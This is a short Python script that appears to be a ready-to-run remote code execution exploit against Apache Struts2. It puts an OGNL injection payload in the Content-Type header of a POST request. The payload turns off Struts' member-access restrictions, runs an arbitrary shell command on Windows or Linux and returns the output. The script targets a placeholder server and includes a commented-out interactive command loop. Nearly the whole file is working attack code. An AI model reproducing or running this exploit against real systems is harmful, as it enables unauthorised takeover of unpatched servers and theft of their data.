import requests
from http.client import HTTPConnection



def init_params():
    def drop_accept_encoding_on_putheader(http_connection_putheader):
        def wrapper(self, header, *values):
            if header == "Accept-Encoding" and "identity" in values:
                return
            return http_connection_putheader(self, header, *values)

        return wrapper

    HTTPConnection.putheader = drop_accept_encoding_on_putheader(HTTPConnection.putheader)


session = requests.Session()
session.headers.clear()
init_params()


def main(url, cmd):
    payload = (
            "%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")
    headers = {
        'Content-Type': payload,
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)',
    }
    response = session.post(url, proxies=proxies, headers=headers)
    print(response.text)


if __name__ == '__main__':
    proxies = {"http": "127.0.0.1:8080", "https": "127.0.0.1:8080", }
    # 挂上burp代理不出错
    proxies = {}

    url = "http://1.2.3.4:8080/download.jsp"
    cmd = 'whoami'

    main(url, cmd)
    # while 1:
    #     main(url, cmd)
    #     cmd = input("input cmd:\n")
    #     print(cmd)
